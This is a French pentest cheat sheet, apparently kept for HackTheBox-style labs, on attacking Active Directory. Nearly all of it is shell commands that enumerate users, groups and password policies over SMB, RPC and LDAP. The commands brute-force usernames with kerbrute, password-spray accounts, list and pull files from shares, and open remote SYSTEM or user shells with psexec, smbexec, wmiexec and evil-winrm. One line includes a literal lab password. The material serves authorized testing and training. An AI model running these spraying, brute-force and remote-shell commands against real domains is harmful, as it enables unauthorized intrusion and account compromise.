---
public: true 
#Tags: tag1, tag2
---

## Récupération d'informations Active Directory et partages

## Politique de mot de passe

### SMB

```shell
# crackmapexec
cme smb $TARGET_IP -u "sql_svc" -p "qsdqsd" -d "domain"  --pass-pol | cut -c60-

# enum4linux
enum4linux -u "" -p "" -P $TARGET_IP

# rpcclient
rpcclient -U "" -N $TARGET_IP
$> querydominfo

```

### LDAP

```shell
# ldapsearch
ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## Comptes utilisateurs
### Découverte

#### Listing

##### SMB

```shell
# crackmapexec
## Accès guest restreint
cme smb $TARGET -u "guest" -p "" --rid-brute 10000  # Max RID a adapter

## Utilisateurs connus (AD / Station)
cme smb $TARGET -u "$AD_USER" -p "$AD_PASSWORD" --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt
```

```shell
## Utilisateurs connectés sur la station
cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --loggedon-users 
```

```shell
# enum4linux
enum4linux -u "$AD_USER" -p "$AD_PASSWORD" -U $TARGET | grep user: | cut -d '[' -f2 | cut -d ']' -f1  | tee users.txt

# enum4linux-ng
enum4linux-ng -u "" -p "" -U $TARGET | grep 'username:' | tr -s ' ' | cut -d ' ' -f3 | tee users.txt

# rpcclient
rpcclient -U "" -N $TARGET -c 'enumdomusers;quit' | grep user: | cut -d '[' -f2 | cut -d ']' -f1  | tee users.txt
```

##### LDAP

```shell
# crackmapexec
cme ldap -u $AD_USER -p $AD_PASSWORD $TARGET_IP -dc-ip $TARGET_IP --users

# ldapsearch
ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -d ' ' -f2

# windapsearch
# liste des administrateurs du domaine
windapsearch.py --dc-ip $TARGET -u $AD_USER@$AD_DOMAIN -p $AD_PASSWORD --da
# liste d'utilisateurs potentiellement à privilèges
windapsearch.py --dc-ip $TARGET -u $AD_USER@$AD_DOMAIN -p $AD_PASSWORD --PU

```

#### Bruteforce

Sans identifiants préalables, on pourra utiliser la liste des noms d'utilisateurs les plus communs provenant de <https://github.com/insidetrust/statistically-likely-usernames> et vérifier quels comptes existent dans l'AD cible.

Par exemple le fichier : <https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt>

```shell
git clone  https://github.com/insidetrust/statistically-likely-usernames 
cd statistically-likely-usernames 
# kerbrute (VERSION SAFE qui s'arrête si un compte se retrouve verouillé (pour éviter le drame))
kerbrute userenum -d $DOMAIN --dc $TARGET --safe top-formats.txt -o "/workspace/Misc Files/valid_user_output.txt"
kerbrute userenum -d $DOMAIN --dc $TARGET --safe jsmith.txt -o valid_user_output.txt

kerbrute userenum -d $DOMAIN --dc $TARGET jsmith.txt -o valid_user_output.txt

### WORD LIST interessantes :
#  top-formats.txt : mix des différents formats avec les noms les plus communs en premier

# creation d'une liste d'utilisateurs valides :
cat valid_user_output.txt | tr -d " \t" | cut -d ':' -f4 | tee users_found_kerbrute.txt

```

Cet utilitaire tente très rapidement tous les utilisateurs de la liste.

Il ne génère par d'évènement dans un AD configuré avec les options par défaut.

#### Attaques

Lorsqu'on dispose d'une liste de comptes utilisateurs, on peut ensuite essayer de trouver leur mots de passe associés.

##### Password Spraying

**Attention** :

- toujours vérifier la politique de mot de passe en place (voir plus haut) avant de tenter un password spraying.
- ne pas tenter le nombre maximum de tentatives autorisées !
- `cme [...] --users`  affiche le nombre de mauvaise saisie des compteurs d'authentification (a exécuter sur le PDC emulator pour avoir l'information centralisée de tous les DCs)

Attaque à partir d'une liste d'utilisateurs avec un mot de passe `$AD_PASSWORD`

```shell
# crackmapexec
cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --local-auth --continue-on-success | grep '+'

# rpcclient
for u in $(cat users.txt);do rpcclient -U "$u%$AD_PASSWORD" -c "getusername;quit" $TARGET_IP | grep Authority; done

# kerbrute
kerbrute passwordspray -d $AD_DOMAIN --dc $TARGET_IP users.txt  "$AD_PASSWORD"
```

## Groupes

```shell
# Liste de tous les groupes
cme smb $TARGET_IP -u "" -p "" --groups
# Liste des membres d'un groupe
cme smb $TARGET_IP -u "" -p "" --groups "Domain Admins"
```

## Partages
##### Enumération

```shell
cme smb $TARGET_IP -u "" -p "" --shares
cme smb $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD" -d "$AD_DOMAIN"  --shares | cut -c60-
```

```shell
# 
cme smb $TARGET_IP  -u 'guest' -p '' --shares | cut -c60-
      [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
      [+] sequel.htb\guest: 
      [+] Enumerated shares
      Share           Permissions     Remark
      -----           -----------     ------
      ADMIN$                          Remote Admin
      C$                              Default share
      IPC$            READ            Remote IPC
      NETLOGON                        Logon server share 
      Public          READ            
      SYSVOL                          Logon server share 
# Authentification NULL
enum4linux -a -u "" -p "" $TARGET_IP

enum4linux-ng -A -R -C <IP>

# Authentification avec le compte Guest (si non désactivé)
enum4linux -a -u "guest" -p "" $TARGET_IP

# liste des partage avec type d'accès (lecture / écrite / rien)
smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP
```

### Accès à un partage

#### smbclient.py

```shell
smbclient.py -no-pass $TARGET_IP  # null bind
smbclient.py "$AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP"    

smbclient.py guest@sequel.htb
Password:       <==== Appuyer sur Entrer
# shares        <==== liste les partages
# use <share name>  <=== se connecte à ce partage
# ls / cd  / cat [...]
```

#### smbclient

```
smbclient -U guest%'' //$TARGET_IP/WorkShares 

# null authentication
smbclient -N -L //$TARGET_IP   # liste les partages
```

#### smbmap

```shell
# Liste des partages 
smbmap -u "" -p "" -H $TARGET_IP   

# Liste de façon récursive les fichiers d'un partage (indique si les droits sont en écriture ou en lecture)
smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R "$SHARE/"
smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R "$SHARE/" --dir-only

# Téléchargement d'un fichier 
$ smbmap -u "" -p "" -H $TARGET_IP --download  "sambashare\contents\flag.txt"

# Upload d'un fichier 
smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP --upload desktop.ini Share/desktop.ini
```

### Explorer les partages

#### crackmapexec

```bash
rm -rf /tmp/cme_spider_plus # dossier contenant les résultats du module spider_plus

# soit Lister tous les fichiers de tous les partages
cme smb $TARGET -u $USER -p "$PASSWORD" -M spider_plus 
# soit Lister tous les fichiers de tous les partages
cme smb $TARGET -u $USER -p "$PASSWORD" -M spider_plus --share 'Some Share'

# Affichage des résultats 
cat /tmp/cme_spider_plus/*.json | jq '. | to_entries | .[] | {share: .key, file: .value | to_entries | .[].key} | "\(.share) | \(.file)"' | tee $TARGET_IP-share_files.txt
```

#### smbmap

```shell
smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R "$SHARE/" --dir-only
```

## Shell

### WinRM

```shell
# Vérification d'accès WINRM
cme winrm $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD" -d "$AD_DOMAIN"  | cut -c61-
     [*] http://10.10.1.55:5985/wsman
     [+] domain.local\User:Mypass (Pwn3d!)
# Obtention du shell via evil-winrm
evil-winrm -i $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD"
```

### RPC + SMB

Exécute un shell distant en tant que SYSTEM

```shell
# Nécessite l'accès au partage Admin$ + RPC pour la communication
psexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
# Nécessite l'accès à un partage quelconque + RPC pour la communication
smbexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
```

### WMI

Exécute un shell semi interactif (spawn un cmd.exe a chaque exécution de commande).

Fourni un accès avec le compte utilisateur utilisé ($AD_USER)

```shell
wmiexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
```

### DECRPC

SCShell

<https://github.com/Mr-Un1k0d3r/SCShell>

## Bloodhound

**Remarque** : Il semble que bloodhound-python collecte moins d'informations que SharpHound ou d'autres ingestors. Il est donc **recommandé** de pas se fier uniquement à ses résultats et à les comparer aux résultats fournis par SharpHound ou autre une fois qu'une machine Windows membre du domains est compromise.

Bloodhound python injector available as a docker image (python2)

sudo docker run --rm -v ${PWD}:/bloodhound-data -it bloodhound

$ bloodhound-python  -u 'svc_apache' -p 'S@Ss!K@*t13' -c All -d 'flight.htb' -v -ns 10.10.11.187

[[BloodHound]]

```
